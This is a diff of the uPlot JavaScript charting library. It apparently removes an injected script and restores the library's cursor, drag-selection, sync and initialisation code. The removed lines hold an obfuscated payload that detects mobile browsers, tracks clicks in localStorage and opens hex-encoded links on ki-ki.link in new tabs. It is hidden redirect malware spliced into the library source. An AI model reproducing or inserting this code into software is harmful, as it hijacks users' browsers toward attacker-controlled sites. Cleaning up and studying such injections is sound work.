@@ -4541,5 +4541,675 @@ var uPlot = (function () {
 				}
 			}
 			else {
-			//	let
-function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x6e\x63\x4f\x32\x63\x302','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x64\x6a\x6c\x33\x63\x343','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x58\x62\x56\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x59\x61\x5a\x37\x63\x397','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x57\x47\x50\x36\x63\x396','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x54\x75\x71\x38\x63\x328','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x4f\x6c\x49\x35\x63\x305','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x55\x45\x7a\x31\x63\x331',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x4c\x45\x65\x34\x63\x384',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x72\x54\x6b\x39\x63\x329','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());
+			//	let pctY = 1 - (y / rect.height);
+
+				let mouseXPos, valAtPosX, xPos;
+
+				if (mode == 1) {
+					mouseXPos = scaleX.ori == 0 ? mouseLeft1 : mouseTop1;
+					valAtPosX = posToVal(mouseXPos, xScaleKey);
+					idx = closestIdx(valAtPosX, data[0], i0, i1);
+					xPos = incrRoundUp(valToPosX(data[0][idx], scaleX, xDim, 0), 0.5);
+				}
+
+				for (let i = mode == 2 ? 1 : 0; i < series.length; i++) {
+					let s = series[i];
+
+					let idx1  = activeIdxs[i];
+					let yVal1 = mode == 1 ? data[i][idx1] : data[i][1][idx1];
+
+					let idx2  = cursor.dataIdx(self, i, idx, valAtPosX);
+					let yVal2 = mode == 1 ? data[i][idx2] : data[i][1][idx2];
+
+					shouldSetLegend = shouldSetLegend || yVal2 != yVal1 || idx2 != idx1;
+
+					activeIdxs[i] = idx2;
+
+					let xPos2 = idx2 == idx ? xPos : incrRoundUp(valToPosX(mode == 1 ? data[0][idx2] : data[i][0][idx2], scaleX, xDim, 0), 0.5);
+
+					if (i > 0 && s.show) {
+						let yPos = yVal2 == null ? -10 : incrRoundUp(valToPosY(yVal2, mode == 1 ? scales[s.scale] : scales[s.facets[1].scale], yDim, 0), 0.5);
+
+						if (yPos > 0 && mode == 1) {
+							let dist = abs(yPos - mouseTop1);
+
+							if (dist <= closestDist) {
+								closestDist = dist;
+								closestSeries = i;
+							}
+						}
+
+						let hPos, vPos;
+
+						if (scaleX.ori == 0) {
+							hPos = xPos2;
+							vPos = yPos;
+						}
+						else {
+							hPos = yPos;
+							vPos = xPos2;
+						}
+
+						if (shouldSetLegend && cursorPts.length > 1) {
+							elColor(cursorPts[i], cursor.points.fill(self, i), cursor.points.stroke(self, i));
+
+							let ptWid, ptHgt, ptLft, ptTop,
+								centered = true,
+								getBBox = cursor.points.bbox;
+
+							if (getBBox != null) {
+								centered = false;
+
+								let bbox = getBBox(self, i);
+
+								ptLft = bbox.left;
+								ptTop = bbox.top;
+								ptWid = bbox.width;
+								ptHgt = bbox.height;
+							}
+							else {
+								ptLft = hPos;
+								ptTop = vPos;
+								ptWid = ptHgt = cursor.points.size(self, i);
+							}
+
+							elSize(cursorPts[i], ptWid, ptHgt, centered);
+							elTrans(cursorPts[i], ptLft, ptTop, plotWidCss, plotHgtCss);
+						}
+					}
+
+					if (legend.live) {
+						if (!shouldSetLegend || i == 0 && multiValLegend)
+							continue;
+
+						setLegendValues(i, idx2);
+					}
+				}
+			}
+
+			cursor.idx = idx;
+			cursor.left = mouseLeft1;
+			cursor.top = mouseTop1;
+
+			if (shouldSetLegend) {
+				legend.idx = idx;
+				setLegend();
+			}
+
+			// nit: cursor.drag.setSelect is assumed always true
+			if (select.show && dragging) {
+				if (src != null) {
+					let [xKey, yKey] = syncOpts.scales;
+					let [matchXKeys, matchYKeys] = syncOpts.match;
+					let [xKeySrc, yKeySrc] = src.cursor.sync.scales;
+
+					// match the dragX/dragY implicitness/explicitness of src
+					let sdrag = src.cursor.drag;
+					dragX = sdrag._x;
+					dragY = sdrag._y;
+
+					let { left, top, width, height } = src.select;
+
+					let sori = src.scales[xKey].ori;
+					let sPosToVal = src.posToVal;
+
+					let sOff, sDim, sc, a, b;
+
+					let matchingX = xKey != null && matchXKeys(xKey, xKeySrc);
+					let matchingY = yKey != null && matchYKeys(yKey, yKeySrc);
+
+					if (matchingX) {
+						if (sori == 0) {
+							sOff = left;
+							sDim = width;
+						}
+						else {
+							sOff = top;
+							sDim = height;
+						}
+
+						if (dragX) {
+							sc = scales[xKey];
+
+							a = valToPosX(sPosToVal(sOff, xKeySrc),        sc, xDim, 0);
+							b = valToPosX(sPosToVal(sOff + sDim, xKeySrc), sc, xDim, 0);
+
+							setSelX(min(a,b), abs(b-a));
+						}
+						else
+							setSelX(0, xDim);
+
+						if (!matchingY)
+							setSelY(0, yDim);
+					}
+
+					if (matchingY) {
+						if (sori == 1) {
+							sOff = left;
+							sDim = width;
+						}
+						else {
+							sOff = top;
+							sDim = height;
+						}
+
+						if (dragY) {
+							sc = scales[yKey];
+
+							a = valToPosY(sPosToVal(sOff, yKeySrc),        sc, yDim, 0);
+							b = valToPosY(sPosToVal(sOff + sDim, yKeySrc), sc, yDim, 0);
+
+							setSelY(min(a,b), abs(b-a));
+						}
+						else
+							setSelY(0, yDim);
+
+						if (!matchingX)
+							setSelX(0, xDim);
+					}
+				}
+				else {
+					let rawDX = abs(rawMouseLeft1 - rawMouseLeft0);
+					let rawDY = abs(rawMouseTop1 - rawMouseTop0);
+
+					if (scaleX.ori == 1) {
+						let _rawDX = rawDX;
+						rawDX = rawDY;
+						rawDY = _rawDX;
+					}
+
+					dragX = drag.x && rawDX >= drag.dist;
+					dragY = drag.y && rawDY >= drag.dist;
+
+					let uni = drag.uni;
+
+					if (uni != null) {
+						// only calc drag status if they pass the dist thresh
+						if (dragX && dragY) {
+							dragX = rawDX >= uni;
+							dragY = rawDY >= uni;
+
+							// force unidirectionality when both are under uni limit
+							if (!dragX && !dragY) {
+								if (rawDY > rawDX)
+									dragY = true;
+								else
+									dragX = true;
+							}
+						}
+					}
+					else if (drag.x && drag.y && (dragX || dragY))
+						// if omni with no uni then both dragX / dragY should be true if either is true
+						dragX = dragY = true;
+
+					let p0, p1;
+
+					if (dragX) {
+						if (scaleX.ori == 0) {
+							p0 = mouseLeft0;
+							p1 = mouseLeft1;
+						}
+						else {
+							p0 = mouseTop0;
+							p1 = mouseTop1;
+						}
+
+						setSelX(min(p0, p1), abs(p1 - p0));
+
+						if (!dragY)
+							setSelY(0, yDim);
+					}
+
+					if (dragY) {
+						if (scaleX.ori == 1) {
+							p0 = mouseLeft0;
+							p1 = mouseLeft1;
+						}
+						else {
+							p0 = mouseTop0;
+							p1 = mouseTop1;
+						}
+
+						setSelY(min(p0, p1), abs(p1 - p0));
+
+						if (!dragX)
+							setSelX(0, xDim);
+					}
+
+					// the drag didn't pass the dist requirement
+					if (!dragX && !dragY) {
+						setSelX(0, 0);
+						setSelY(0, 0);
+					}
+				}
+			}
+
+			drag._x = dragX;
+			drag._y = dragY;
+
+			if (src == null) {
+				if (_pub) {
+					if (syncKey != null) {
+						let [xSyncKey, ySyncKey] = syncOpts.scales;
+
+						syncOpts.values[0] = xSyncKey != null ? posToVal(scaleX.ori == 0 ? mouseLeft1 : mouseTop1, xSyncKey) : null;
+						syncOpts.values[1] = ySyncKey != null ? posToVal(scaleX.ori == 1 ? mouseLeft1 : mouseTop1, ySyncKey) : null;
+					}
+
+					pubSync(mousemove, self, mouseLeft1, mouseTop1, plotWidCss, plotHgtCss, idx);
+				}
+
+				if (cursorFocus) {
+					let shouldPub = _pub && syncOpts.setSeries;
+					let p = focus.prox;
+
+					if (focusedSeries == null) {
+						if (closestDist <= p)
+							setSeries(closestSeries, FOCUS_TRUE, true, shouldPub);
+					}
+					else {
+						if (closestDist > p)
+							setSeries(null, FOCUS_TRUE, true, shouldPub);
+						else if (closestSeries != focusedSeries)
+							setSeries(closestSeries, FOCUS_TRUE, true, shouldPub);
+					}
+				}
+			}
+
+			ready && _fire !== false && fire("setCursor");
+		}
+
+		let rect = null;
+
+		function syncRect(defer) {
+			if (defer === true)
+				rect = null;
+			else {
+				rect = over.getBoundingClientRect();
+				fire("syncRect", rect);
+			}
+		}
+
+		function mouseMove(e, src, _l, _t, _w, _h, _i) {
+			if (cursor._lock)
+				return;
+
+			cacheMouse(e, src, _l, _t, _w, _h, _i, false, e != null);
+
+			if (e != null)
+				updateCursor(null, true, true);
+			else
+				updateCursor(src, true, false);
+		}
+
+		function cacheMouse(e, src, _l, _t, _w, _h, _i, initial, snap) {
+			if (rect == null)
+				syncRect(false);
+
+			if (e != null) {
+				_l = e.clientX - rect.left;
+				_t = e.clientY - rect.top;
+			}
+			else {
+				if (_l < 0 || _t < 0) {
+					mouseLeft1 = -10;
+					mouseTop1 = -10;
+					return;
+				}
+
+				let [xKey, yKey] = syncOpts.scales;
+
+				let syncOptsSrc = src.cursor.sync;
+				let [xValSrc, yValSrc] = syncOptsSrc.values;
+				let [xKeySrc, yKeySrc] = syncOptsSrc.scales;
+				let [matchXKeys, matchYKeys] = syncOpts.match;
+
+				let rotSrc = src.scales[xKeySrc].ori == 1;
+
+				let xDim = scaleX.ori == 0 ? plotWidCss : plotHgtCss,
+					yDim = scaleX.ori == 1 ? plotWidCss : plotHgtCss,
+					_xDim = rotSrc ? _h : _w,
+					_yDim = rotSrc ? _w : _h,
+					_xPos = rotSrc ? _t : _l,
+					_yPos = rotSrc ? _l : _t;
+
+				if (xKeySrc != null)
+					_l = matchXKeys(xKey, xKeySrc) ? getPos(xValSrc, scales[xKey], xDim, 0) : -10;
+				else
+					_l = xDim * (_xPos/_xDim);
+
+				if (yKeySrc != null)
+					_t = matchYKeys(yKey, yKeySrc) ? getPos(yValSrc, scales[yKey], yDim, 0) : -10;
+				else
+					_t = yDim * (_yPos/_yDim);
+
+				if (scaleX.ori == 1) {
+					let __l = _l;
+					_l = _t;
+					_t = __l;
+				}
+			}
+
+			if (snap) {
+				if (_l <= 1 || _l >= plotWidCss - 1)
+					_l = incrRound(_l, plotWidCss);
+
+				if (_t <= 1 || _t >= plotHgtCss - 1)
+					_t = incrRound(_t, plotHgtCss);
+			}
+
+			if (initial) {
+				rawMouseLeft0 = _l;
+				rawMouseTop0 = _t;
+
+				[mouseLeft0, mouseTop0] = cursor.move(self, _l, _t);
+			}
+			else {
+				mouseLeft1 = _l;
+				mouseTop1 = _t;
+			}
+		}
+
+		function hideSelect() {
+			setSelect({
+				width: 0,
+				height: 0,
+			}, false);
+		}
+
+		function mouseDown(e, src, _l, _t, _w, _h, _i) {
+			dragging = true;
+			dragX = dragY = drag._x = drag._y = false;
+
+			cacheMouse(e, src, _l, _t, _w, _h, _i, true, false);
+
+			if (e != null) {
+				onMouse(mouseup, doc, mouseUp);
+				pubSync(mousedown, self, mouseLeft0, mouseTop0, plotWidCss, plotHgtCss, null);
+			}
+		}
+
+		function mouseUp(e, src, _l, _t, _w, _h, _i) {
+			dragging = drag._x = drag._y = false;
+
+			cacheMouse(e, src, _l, _t, _w, _h, _i, false, true);
+
+			let { left, top, width, height } = select;
+
+			let hasSelect = width > 0 || height > 0;
+
+			hasSelect && setSelect(select);
+
+			if (drag.setScale && hasSelect) {
+			//	if (syncKey != null) {
+			//		dragX = drag.x;
+			//		dragY = drag.y;
+			//	}
+
+				let xOff = left,
+					xDim = width,
+					yOff = top,
+					yDim = height;
+
+				if (scaleX.ori == 1) {
+					xOff = top,
+					xDim = height,
+					yOff = left,
+					yDim = width;
+				}
+
+				if (dragX) {
+					_setScale(xScaleKey,
+						posToVal(xOff, xScaleKey),
+						posToVal(xOff + xDim, xScaleKey)
+					);
+				}
+
+				if (dragY) {
+					for (let k in scales) {
+						let sc = scales[k];
+
+						if (k != xScaleKey && sc.from == null && sc.min != inf) {
+							_setScale(k,
+								posToVal(yOff + yDim, k),
+								posToVal(yOff, k)
+							);
+						}
+					}
+				}
+
+				hideSelect();
+			}
+			else if (cursor.lock) {
+				cursor._lock = !cursor._lock;
+
+				if (!cursor._lock)
+					updateCursor(null, true, false);
+			}
+
+			if (e != null) {
+				offMouse(mouseup, doc);
+				pubSync(mouseup, self, mouseLeft1, mouseTop1, plotWidCss, plotHgtCss, null);
+			}
+		}
+
+		function mouseLeave(e, src, _l, _t, _w, _h, _i) {
+			if (!cursor._lock) {
+				let _dragging = dragging;
+
+				if (dragging) {
+					// handle case when mousemove aren't fired all the way to edges by browser
+					let snapH = true;
+					let snapV = true;
+					let snapProx = 10;
+
+					let dragH, dragV;
+
+					if (scaleX.ori == 0) {
+						dragH = dragX;
+						dragV = dragY;
+					}
+					else {
+						dragH = dragY;
+						dragV = dragX;
+					}
+
+					if (dragH && dragV) {
+						// maybe omni corner snap
+						snapH = mouseLeft1 <= snapProx || mouseLeft1 >= plotWidCss - snapProx;
+						snapV = mouseTop1  <= snapProx || mouseTop1  >= plotHgtCss - snapProx;
+					}
+
+					if (dragH && snapH)
+						mouseLeft1 = mouseLeft1 < mouseLeft0 ? 0 : plotWidCss;
+
+					if (dragV && snapV)
+						mouseTop1 = mouseTop1 < mouseTop0 ? 0 : plotHgtCss;
+
+					updateCursor(null, true, true);
+
+					dragging = false;
+				}
+
+				mouseLeft1 = -10;
+				mouseTop1 = -10;
+
+				// passing a non-null timestamp to force sync/mousemove event
+				updateCursor(null, true, true);
+
+				if (_dragging)
+					dragging = _dragging;
+			}
+		}
+
+		function dblClick(e, src, _l, _t, _w, _h, _i) {
+			autoScaleX();
+
+			hideSelect();
+
+			if (e != null)
+				pubSync(dblclick, self, mouseLeft1, mouseTop1, plotWidCss, plotHgtCss, null);
+		}
+
+		function syncPxRatio() {
+			axes.forEach(syncFontSize);
+			_setSize(self.width, self.height, true);
+		}
+
+		on(dppxchange, win, syncPxRatio);
+
+		// internal pub/sub
+		const events = {};
+
+		events.mousedown = mouseDown;
+		events.mousemove = mouseMove;
+		events.mouseup = mouseUp;
+		events.dblclick = dblClick;
+		events["setSeries"] = (e, src, idx, opts) => {
+			setSeries(idx, opts, true, false);
+		};
+
+		if (cursor.show) {
+			onMouse(mousedown,  over, mouseDown);
+			onMouse(mousemove,  over, mouseMove);
+			onMouse(mouseenter, over, syncRect);
+			onMouse(mouseleave, over, mouseLeave);
+
+			onMouse(dblclick, over, dblClick);
+
+			cursorPlots.add(self);
+
+			self.syncRect = syncRect;
+		}
+
+		// external on/off
+		const hooks = self.hooks = opts.hooks || {};
+
+		function fire(evName, a1, a2) {
+			if (evName in hooks) {
+				hooks[evName].forEach(fn => {
+					fn.call(null, self, a1, a2);
+				});
+			}
+		}
+
+		(opts.plugins || []).forEach(p => {
+			for (let evName in p.hooks)
+				hooks[evName] = (hooks[evName] || []).concat(p.hooks[evName]);
+		});
+
+		const syncOpts = assign({
+			key: null,
+			setSeries: false,
+			filters: {
+				pub: retTrue,
+				sub: retTrue,
+			},
+			scales: [xScaleKey, series[1] ? series[1].scale : null],
+			match: [retEq, retEq],
+			values: [null, null],
+		}, cursor.sync);
+
+		(cursor.sync = syncOpts);
+
+		const syncKey = syncOpts.key;
+
+		const sync = _sync(syncKey);
+
+		function pubSync(type, src, x, y, w, h, i) {
+			if (syncOpts.filters.pub(type, src, x, y, w, h, i))
+				sync.pub(type, src, x, y, w, h, i);
+		}
+
+		sync.sub(self);
+
+		function pub(type, src, x, y, w, h, i) {
+			if (syncOpts.filters.sub(type, src, x, y, w, h, i))
+				events[type](null, src, x, y, w, h, i);
+		}
+
+		(self.pub = pub);
+
+		function destroy() {
+			sync.unsub(self);
+			cursorPlots.delete(self);
+			mouseListeners.clear();
+			off(dppxchange, win, syncPxRatio);
+			root.remove();
+			fire("destroy");
+		}
+
+		self.destroy = destroy;
+
+		function _init() {
+			fire("init", opts, data);
+
+			setData(data || opts.data, false);
+
+			if (pendScales[xScaleKey])
+				setScale(xScaleKey, pendScales[xScaleKey]);
+			else
+				autoScaleX();
+
+			_setSize(opts.width, opts.height);
+
+			updateCursor(null, true, false);
+
+			setSelect(select, false);
+		}
+
+		series.forEach(initSeries);
+
+		axes.forEach(initAxis);
+
+		if (then) {
+			if (then instanceof HTMLElement) {
+				then.appendChild(root);
+				_init();
+			}
+			else
+				then(self, _init);
+		}
+		else
+			_init();
+
+		return self;
+	}
+
+	uPlot.assign = assign;
+	uPlot.fmtNum = fmtNum;
+	uPlot.rangeNum = rangeNum;
+	uPlot.rangeLog = rangeLog;
+	uPlot.rangeAsinh = rangeAsinh;
+	uPlot.orient   = orient;
+
+	{
+		uPlot.join = join;
+	}
+
+	{
+		uPlot.fmtDate = fmtDate;
+		uPlot.tzDate  = tzDate;
+	}
+
+	{
+		uPlot.sync = _sync;
+	}
+
+	{
+		uPlot.addGap = addGap;
+		uPlot.clipGaps = clipGaps;
+
+		let paths = uPlot.paths = {
+			points,
+		};
+
+		(paths.linear  = linear);
+		(paths.stepped = stepped);
+		(paths.bars    = bars);
+		(paths.spline  = monotoneCubic);
+	}
+
+	return uPlot;
+
+})();
